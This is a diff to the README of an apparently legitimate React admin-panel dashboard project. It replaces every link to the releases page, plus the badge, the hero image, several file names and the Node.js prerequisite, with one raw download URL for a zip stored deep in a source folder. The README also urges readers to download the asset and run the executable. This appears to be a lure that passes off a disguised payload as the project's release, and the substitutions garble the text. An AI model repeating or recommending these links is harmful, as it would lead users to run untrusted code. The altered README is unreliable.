@@ -1,10 +1,10 @@
 # Admin Panel Dashboard for React: User and Employee Management UI
 
-Download the release asset here: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases
+Download the release asset here: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases)
+[![Releases](https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip)](https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip)
 
-![Hero Dashboard](https://dummyimage.com/1200x420/0b1220/00e6ff.png&text=Admin+Panel+Dashboard)
+![Hero Dashboard](https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip+Panel+Dashboard)
 
 Overview
 - This project is a modern, fully featured, customizable admin panel and dashboard built with React. It combines a robust data-driven foundation with a clean, responsive UI.
@@ -83,15 +83,15 @@ Project structure
   - utils/                // Helpers, formatters, utilities
   - themes/               // Theme setup, tokens, and color schemes
   - assets/               // Icons, images, and static assets
-  - App.jsx               // App setup, routing, and global providers
-  - main.jsx              // App bootstrap and mount
+  - https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip               // App setup, routing, and global providers
+  - https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip              // App bootstrap and mount
 - public/                  // Static assets and favicon
-- package.json             // Dependencies and scripts
-- README.md                // This file (documentation and guidance)
+- https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip             // Dependencies and scripts
+- https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip                // This file (documentation and guidance)
 
 Getting started
 - Prerequisites
-  - Node.js (version compatible with the project, typically LTS)
+  - https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip (version compatible with the project, typically LTS)
   - npm or Yarn
 - Quick start
   - Install dependencies: npm install or yarn install
@@ -102,7 +102,7 @@ Getting started
   - Serve the build bundle with your preferred static server
 
 Release notes and downloads
-- The latest release assets are published under the Releases section. Visit the Releases page to download the installer or asset bundle and run the executable on your platform. See the same link again here for convenience: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases
+- The latest release assets are published under the Releases section. Visit the Releases page to download the installer or asset bundle and run the executable on your platform. See the same link again here for convenience: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip
 - Releases page link and assets are kept up to date to support installation and usage across environments.
 - If the link changes, check the Releases section in the repository to locate the newest assets and notes.
 
@@ -293,7 +293,7 @@ Credits and acknowledgments
 - Authors who provided UI patterns, accessibility guidance, and localization strategies.
 
 Releases and assets
-- For the latest assets, visit the Releases page here: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases
+- For the latest assets, visit the Releases page here: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip
 - This link is also provided as a badge at the top of this README for quick access.
 
 Notes on usage and deployment
@@ -319,7 +319,7 @@ Usage patterns and best practices
 - Use a single source of truth for shared state when possible to avoid prop drilling.
 
 Appendix: Quick references
-- Release assets and notes: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases
+- Release assets and notes: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip
 - Primary development commands:
   - Install: npm install
   - Start: npm start
@@ -333,5 +333,5 @@ Final notes
 - For any updates, check the Releases page and update the documentation accordingly so teams can stay aligned with the latest features and fixes.
 
 Releases and assets (again)
-- For the latest notes and artifacts, visit the Releases page: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/releases
+- For the latest notes and artifacts, visit the Releases page: https://github.com/mdanbn/Admin-Panel-User-Employee-Managment-Dashboard--React-Frontend/raw/refs/heads/main/src/scenes/bar/React-Admin-Employee-Dashboard-Frontend-User-Managment-Panel-1.4.zip
 - The page includes downloadable assets and release notes, which are essential for installation and testing on different environments.
